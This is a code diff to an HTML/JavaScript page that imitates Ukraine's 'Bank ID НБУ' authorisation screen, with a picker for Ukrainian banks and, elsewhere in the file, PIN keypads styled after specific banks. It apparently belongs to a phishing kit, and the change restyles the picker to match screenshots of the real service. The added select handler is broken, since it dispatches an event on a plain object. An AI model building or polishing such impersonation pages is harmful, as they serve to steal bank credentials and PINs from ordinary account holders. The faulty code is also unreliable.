@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Для авторизації оеріть свій банк</title>
+    <title>Для авторизації оберіть свій банк</title>
     <style>
         /* Общие стили для всех экранов и элементов */
         *, *::before, *::after { box-sizing: border-box; }
@@ -635,12 +635,91 @@
             .oschad-pin-keypad, .raiff-keypad { max-width: 300px; }
             .bank-grid { grid-template-columns: repeat(4, 1fr); max-width: 800px; margin: 0 auto; }
         }
+
+        /* Измененный дизайн выбора банка как на скринах */
+        #bank-selection-screen {
+            background: #fff;
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .bank-header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        .bank-header h1 {
+            font-size: 32px;
+            font-weight: 700;
+            margin: 0;
+        }
+        .bank-select-wrapper {
+            width: 100%;
+            max-width: 400px;
+            position: relative;
+        }
+        .bank-select-label {
+            font-size: 16px;
+            color: #212529;
+            margin-bottom: 10px;
+            display: block;
+            text-align: left;
+        }
+        .bank-select {
+            width: 100%;
+            padding: 15px;
+            border: 1px solid #dee2e6;
+            border-radius: 12px;
+            background: #fff;
+            font-size: 16px;
+            color: #212529;
+            appearance: none;
+            cursor: pointer;
+            position: relative;
+            background-image: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBkPSJNNiAxMUwxMiAxN0wxOCAxMSIgc3Ryb2tlPSIjNmM3NTdkIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIvPjwvc3ZnPg==');
+            background-repeat: no-repeat;
+            background-position: right 15px center;
+        }
+        .bank-select:focus {
+            border-color: #00A39C;
+            outline: none;
+        }
+        .bank-select option {
+            padding: 10px;
+            display: flex;
+            align-items: center;
+        }
+        .bank-select option::before {
+            content: "";
+            display: inline-block;
+            width: 30px;
+            height: 30px;
+            margin-right: 10px;
+            background-size: contain;
+            background-repeat: no-repeat;
+        }
     </style>
 </head>
 <body>
     <div id="bank-selection-screen" class="screen">
-        <h1>Для авторизації оберіть свій банк</h1>
-        <div class="bank-grid"></div>
+        <div class="bank-header">
+            <h1>Bank ID НБУ</h1>
+        </div>
+        <div class="bank-select-wrapper">
+            <label class="bank-select-label">Оберіть банк, в якому ви маєте рахунок</label>
+            <select class="bank-select" id="bank-select">
+                <option value="" disabled selected hidden></option>
+                <option value="oschadbank">Ощадбанк</option>
+                <option value="raiffeisen">Райффайзен Банк</option>
+                <option value="alliance">Альянс</option>
+                <option value="vostok">Восток</option>
+                <option value="izibank">Izibank</option>
+                <option value="ukrsib">Укрсиб</option>
+                <option value="pumb">ПУМБ</option>
+                <option value="privat24">Приват24</option>
+            </select>
+        </div>
     </div>
 
     <div id="form-screen" class="screen">
@@ -724,11 +803,17 @@ document.addEventListener('DOMContentLoaded', () => {
     const unavailableModalContent = document.getElementById('unavailable-modal-content'); // NEW
     
     // --- INITIALIZATION ---
-    bankGrid.innerHTML = Object.keys(bankFlows).map(id => {
-        const isDisabled = disabledBanks.includes(id) ? ' disabled' : ''; // NEW: Check for disabled banks
-        const disabledLabel = isDisabled ? '<span class="unavailable-label">Недоступно</span>' : ''; // NEW
-        return `<a href="#" class="bank-item${isDisabled}" data-bank="${id}"><img src="${bankFlows[id].logoUrl}" alt="${bankFlows[id].name}"><span class="bank-name">${bankFlows[id].name}</span>${disabledLabel}</a>`;
-    }).join('');
+    // Измененный дизайн - больше нет bankGrid, используем селект
+    const bankSelect = document.getElementById('bank-select');
+    // Добавляем обработчик на селект
+    bankSelect.addEventListener('change', (e) => {
+        const bankId = e.target.value;
+        if (bankId) {
+            const item = { dataset: { bank: bankId } }; // Имитируем bank-item
+            const clickEvent = new Event('click');
+            item.dispatchEvent(clickEvent); // Запускаем логику клика
+        }
+    });
 
     // --- ОПТИМИЗИРОВАННАЯ ЛОГИКА ---
     const hideAllModals = () => {
